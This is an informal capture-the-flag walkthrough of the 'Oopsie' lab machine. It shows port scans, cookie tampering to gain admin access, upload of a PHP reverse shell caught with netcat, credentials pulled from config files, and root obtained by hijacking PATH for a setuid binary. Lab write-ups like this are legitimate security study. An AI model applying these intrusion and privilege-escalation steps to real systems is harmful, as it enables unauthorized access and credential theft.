

Ok, we create our folders in which we are going to work, we made the first scans and this are the results

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

The website says that we must login, but we cannot find the login, we are going to use burpsuit wit a "web crawler"

Apparently this is new for me , I didnt know that when you open burpsuit and youre looking info abut the site, you can see folders and things for example .. loggins and etc

![[Screenshot_2023-09-01_10_06_17.png]]

This is very vulnerable... when you navigate as guest the navigator has this

```
http://10.129.31.249/cdn-cgi/login/admin.php?content=accounts&id=2
```

So, we can change de user , and watch on the cookies , what are the cookies of the admin or another users

admin access ID: 34322
name: admin

Ok, this was very stupid but it works, you change the cookies on the developer tools. Now we can upload files as admin, so I think we can add php malicious 

We did it , we put the pentest monkey php reverse shell. Now, we need to see where is the file so it can be executed.

```
gobuster dir --url http://10.129.31.249/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
```
So, this is the folder
```
http://10.129.31.249/uploads/
```
This is the route
```
http://10.129.31.249/uploads/php-reverse-shell.php
```

WE listen with netcat and then we connect to the target. Now if we want to have a tty or something similar we must use this script , the other one (exploit /dev/null -c bash isnt work here)

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

we ho to /home/robert and we can catch the user flag

f2c74ee8db7983851ab2a96a44eb7981


Ok.. the correct path of this machine is just find the password of robert

Now on  a folder called cdn-cgi there was another called logins, inside of this we did this query


Very cool, you cat all the archives and search for the "passw" in everyone of them at the same time
```
cat * | grep -i passw*
```
I dont know why -i .. if i use grep passw* is the same result.. 
```
if($_POST["username"]==="admin" && $_POST["password"]==="MEGACORP_4dm1n!!")
<input type="password" name="password" placeholder="Password" />

```

By the way, this is not the password for robert the password is on the db.php file and this is 
```
M3g4C0rpUs3r!
```


# Privilege scalation #


```
sudo -l
```
as we know first of all we use , and robert has no permissions.
```
id
```
This shows the groups and the id of robert
```
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
```
Robert is in group called "bugtracker", now we are going to find files or something interesting of this group, because robert is part of this one 
```
find / -group bugtracker 2>/dev/null
```
There is a file of bugtracker
```
/usr/bin/bugtracker
```
here we see priviledges and i dont know what does "file"
```
ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker
```
And
ls -la /usr/bin/bugtracker
```
-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
```

file gives us this info:
```
/usr/bin/bugtracker: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=b87543421344c400a95cbbe34bbc885698b52b8d, not stripped
```

SO, when we execute this binary asks us  a bug id and then he cat something on /root/reports
```
/usr/bin/bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 12
12
---------------

cat: /root/reports/12: No such file or directory

```

The tool is accepting user input as a name of the file that will be read using the cat command, however, it does not specifies the whole path to file cat and thus we might be able to exploit this. We will navigate to /tmp directory and create a file named cat with the following content:

```
/bin/sh
```
We will then set the execute privileges:
```
chmod +x cat
```
this was hard.. first create the file with 
```
touch cat 
```
and then add the content
```
echo "/bin/sh" > cat
```

now chmod +x cat

Now modify the path

```
export PATH=/tmp:$PATH
```

now we execute the comand and we are root

```
robert@oopsie:/tmp$ bugtracker
bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: whoami
whoami
---------------

# whoami
whoami
root
# 

```

this is the root flag
af13b0bee69f8a877c3faf667f7beacf